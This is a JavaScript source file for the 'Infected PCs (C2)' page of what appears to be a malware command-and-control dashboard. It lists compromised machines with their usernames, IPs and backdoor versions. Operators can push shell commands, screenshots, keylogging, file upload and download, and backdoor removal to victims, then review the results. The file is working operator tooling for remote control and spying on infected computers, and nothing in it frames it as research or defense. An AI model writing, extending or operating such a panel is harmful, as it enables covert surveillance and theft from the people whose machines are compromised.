const InfectedPage = {
    _pcs: [],
    _selectedPc: null,
    _refreshInterval: null,

    async render() {
        const el = document.getElementById('page-infected');
        el.innerHTML = `
            <div class="section-header"><h2>Infected PCs (C2)</h2></div>
            <div class="row g-3">
                <div class="col-md-4">
                    <div class="mb-2">
                        <select class="form-select form-select-sm" id="inf-filter-status">
                            <option value="">All Status</option>
                            <option value="active">Active</option>
                            <option value="inactive">Inactive</option>
                            <option value="removed">Removed</option>
                        </select>
                    </div>
                    <div id="inf-pc-list" class="pc-list-scroll">${B33Utils.loading()}</div>
                </div>
                <div class="col-md-8">
                    <div id="inf-detail-panel">
                        <div class="empty-state"><h5>Select a PC from the list</h5></div>
                    </div>
                </div>
            </div>
        `;
        document.getElementById('inf-filter-status').addEventListener('change', () => this.loadData());
        await this.loadData();
    },

    async loadData() {
        const listEl = document.getElementById('inf-pc-list');
        listEl.innerHTML = B33Utils.loading();
        try {
            const status = document.getElementById('inf-filter-status').value;
            const res = await B33Api.getInfected(status ? { status } : {});
            this._pcs = res.data || [];
            this._renderList();
        } catch (err) {
            listEl.innerHTML = `<div class="alert alert-danger">${B33Utils.escapeHtml(err.message)}</div>`;
        }
    },

    _renderList() {
        const listEl = document.getElementById('inf-pc-list');
        if (this._pcs.length === 0) { listEl.innerHTML = B33Utils.emptyState('No infected PCs'); return; }

        listEl.innerHTML = this._pcs.map((pc, i) => `
            <div class="pc-list-card ${this._selectedPc && this._selectedPc.pc_id === pc.pc_id ? 'selected' : ''}" data-idx="${i}">
                <div class="d-flex align-items-center">
                    <span class="status-dot ${(pc.status || 'inactive').toLowerCase()}"></span>
                    <span class="pc-hostname">${B33Utils.escapeHtml(B33Utils.deref(pc.hostname, 'Unknown'))}</span>
                </div>
                <div class="pc-meta">
                    ${B33Utils.escapeHtml(B33Utils.deref(pc.internal_ip, ''))}
                    ${pc.last_heartbeat ? ' &middot; ' + B33Utils.timeAgo(pc.last_heartbeat) : ''}
                </div>
            </div>
        `).join('');

        listEl.querySelectorAll('.pc-list-card').forEach(card => {
            card.addEventListener('click', () => {
                const idx = parseInt(card.dataset.idx);
                this._selectPC(this._pcs[idx]);
                listEl.querySelectorAll('.pc-list-card').forEach(c => c.classList.remove('selected'));
                card.classList.add('selected');
            });
        });
    },

    _selectPC(pc) {
        this._selectedPc = pc;
        this._clearRefresh();
        this._renderDetail(pc);
        this._loadCommandHistory(pc.pc_id);
        this._refreshInterval = setInterval(() => this._loadCommandHistory(pc.pc_id), 10000);
    },

    _renderDetail(pc) {
        const panel = document.getElementById('inf-detail-panel');
        panel.innerHTML = `
            <div class="b33-card p-3 mb-3">
                <div class="d-flex justify-content-between align-items-start mb-3">
                    <h5 class="mb-0">${B33Utils.escapeHtml(B33Utils.deref(pc.hostname, 'Unknown'))}</h5>
                    ${B33Utils.statusBadge(pc.status)}
                </div>
                <div class="row small">
                    <div class="col-6 mb-2"><strong>PC ID:</strong> <span class="mono">${B33Utils.escapeHtml(pc.pc_id)}</span></div>
                    <div class="col-6 mb-2"><strong>Username:</strong> ${B33Utils.escapeHtml(B33Utils.deref(pc.username))}</div>
                    <div class="col-6 mb-2"><strong>Internal IP:</strong> <span class="mono">${B33Utils.escapeHtml(B33Utils.deref(pc.internal_ip))}</span></div>
                    <div class="col-6 mb-2"><strong>External IP:</strong> <span class="mono">${B33Utils.escapeHtml(B33Utils.deref(pc.external_ip))}</span></div>
                    <div class="col-6 mb-2"><strong>OS:</strong> ${B33Utils.escapeHtml(B33Utils.deref(pc.operating_system))}</div>
                    <div class="col-6 mb-2"><strong>Arch:</strong> ${B33Utils.escapeHtml(B33Utils.deref(pc.architecture))}</div>
                    <div class="col-6 mb-2"><strong>Backdoor:</strong> ${B33Utils.escapeHtml(B33Utils.deref(pc.backdoor_version))}</div>
                    <div class="col-6 mb-2"><strong>Deployed via:</strong> ${B33Utils.escapeHtml(B33Utils.deref(pc.deployment_method))}</div>
                    <div class="col-6 mb-2"><strong>Last Heartbeat:</strong> ${B33Utils.timeAgo(pc.last_heartbeat)}</div>
                    <div class="col-6 mb-2"><strong>Registered:</strong> ${B33Utils.formatDate(pc.created_at)}</div>
                </div>
            </div>

            <div class="b33-card p-3 mb-3">
                <h6 class="text-muted mb-2">Notes</h6>
                <div class="d-flex gap-2">
                    <textarea class="form-control form-control-sm" id="inf-notes" rows="2">${B33Utils.escapeHtml(B33Utils.deref(pc.notes, ''))}</textarea>
                    <button class="btn btn-sm btn-outline-primary" id="inf-save-notes">Save</button>
                </div>
                <div class="mt-2">
                    <span class="small text-muted me-2">Status:</span>
                    <button class="btn btn-sm btn-outline-success me-1" data-status="active">Active</button>
                    <button class="btn btn-sm btn-outline-secondary me-1" data-status="inactive">Inactive</button>
                    <button class="btn btn-sm btn-outline-danger" data-status="removed">Removed</button>
                </div>
            </div>

            <div class="b33-card p-3 mb-3">
                <h6 class="text-muted mb-2">Send Command</h6>
                <div class="row g-2">
                    <div class="col-auto">
                        <select class="form-select form-select-sm" id="inf-cmd-type">
                            <option value="shell">Shell</option>
                            <option value="screenshot">Screenshot</option>
                            <option value="keylog">Keylog</option>
                            <option value="upload">Upload</option>
                            <option value="download">Download</option>
                            <option value="remove">Remove Backdoor</option>
                        </select>
                    </div>
                    <div class="col" id="inf-cmd-data-wrap">
                        <input type="text" class="form-control form-control-sm" id="inf-cmd-data" placeholder="Enter command...">
                    </div>
                    <div class="col-auto">
                        <button class="btn btn-sm btn-success" id="inf-send-cmd">Send</button>
                    </div>
                </div>
            </div>

            <div class="b33-card p-3 mb-3">
                <h6 class="text-muted mb-2">Command History</h6>
                <div id="inf-cmd-history" class="command-history-scroll">${B33Utils.loading()}</div>
            </div>

            <div class="danger-zone">
                <h6>Danger Zone</h6>
                <button class="btn btn-sm btn-outline-danger" id="inf-delete-pc">Delete PC Record</button>
            </div>
        `;

        // Event handlers
        document.getElementById('inf-save-notes').addEventListener('click', async () => {
            try {
                await B33Api.updateInfected(pc.pc_id, { notes: document.getElementById('inf-notes').value });
                B33Utils.showToast('Notes saved', 'success');
            } catch (err) { B33Utils.showToast('Failed: ' + err.message, 'error'); }
        });

        panel.querySelectorAll('[data-status]').forEach(btn => {
            btn.addEventListener('click', async () => {
                try {
                    await B33Api.updateInfected(pc.pc_id, { status: btn.dataset.status });
                    B33Utils.showToast('Status updated', 'success');
                    this.loadData();
                } catch (err) { B33Utils.showToast('Failed: ' + err.message, 'error'); }
            });
        });

        const cmdType = document.getElementById('inf-cmd-type');
        const cmdDataWrap = document.getElementById('inf-cmd-data-wrap');
        cmdType.addEventListener('change', () => {
            const noData = ['screenshot', 'keylog', 'remove'].includes(cmdType.value);
            cmdDataWrap.style.display = noData ? 'none' : '';
        });

        document.getElementById('inf-send-cmd').addEventListener('click', async () => {
            const type = cmdType.value;
            const data = document.getElementById('inf-cmd-data').value.trim() || null;
            if (type === 'remove') {
                const confirmed = await B33Utils.confirm('Remove Backdoor', `This will send a self-destruct command to <strong>${B33Utils.escapeHtml(B33Utils.deref(pc.hostname, pc.pc_id))}</strong>. Continue?`);
                if (!confirmed) return;
            }
            try {
                await B33Api.sendCommand(pc.pc_id, type, data);
                B33Utils.showToast('Command sent', 'success');
                document.getElementById('inf-cmd-data').value = '';
                this._loadCommandHistory(pc.pc_id);
            } catch (err) { B33Utils.showToast('Failed: ' + err.message, 'error'); }
        });

        document.getElementById('inf-delete-pc').addEventListener('click', async () => {
            const confirmed = await B33Utils.confirm('Delete PC', `Permanently delete <strong>${B33Utils.escapeHtml(B33Utils.deref(pc.hostname, pc.pc_id))}</strong>?`);
            if (!confirmed) return;
            try {
                await B33Api.deleteInfected(pc.pc_id);
                B33Utils.showToast('PC deleted', 'success');
                this._selectedPc = null;
                document.getElementById('inf-detail-panel').innerHTML = '<div class="empty-state"><h5>Select a PC from the list</h5></div>';
                this._clearRefresh();
                this.loadData();
            } catch (err) { B33Utils.showToast('Failed: ' + err.message, 'error'); }
        });
    },

    async _loadCommandHistory(pcId) {
        const histEl = document.getElementById('inf-cmd-history');
        if (!histEl) return;
        try {
            const res = await B33Api.getC2Logs({ pc_id: pcId });
            const logs = res.data || [];
            if (logs.length === 0) { histEl.innerHTML = '<div class="small text-muted">No commands yet</div>'; return; }
            histEl.innerHTML = `
                <table class="table b33-table table-sm mb-0">
                    <thead><tr><th>Type</th><th>Command</th><th>Status</th><th>Result</th><th>Time</th></tr></thead>
                    <tbody>
                        ${logs.map(l => `
                            <tr>
                                <td><span class="badge bg-secondary">${B33Utils.escapeHtml(l.command_type)}</span></td>
                                <td class="mono">${B33Utils.escapeHtml(B33Utils.truncate(B33Utils.deref(l.command_data), 30))}</td>
                                <td>${B33Utils.statusBadge(l.status)}</td>
                                <td>${l.result ? `<div class="command-output">${B33Utils.escapeHtml(l.result)}</div>` : '-'}</td>
                                <td>${B33Utils.timeAgo(l.created_at)}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            `;
        } catch (err) {
            histEl.innerHTML = `<div class="small text-danger">${B33Utils.escapeHtml(err.message)}</div>`;
        }
    },

    _clearRefresh() {
        if (this._refreshInterval) { clearInterval(this._refreshInterval); this._refreshInterval = null; }
    },

    cleanup() { this._clearRefresh(); }
};
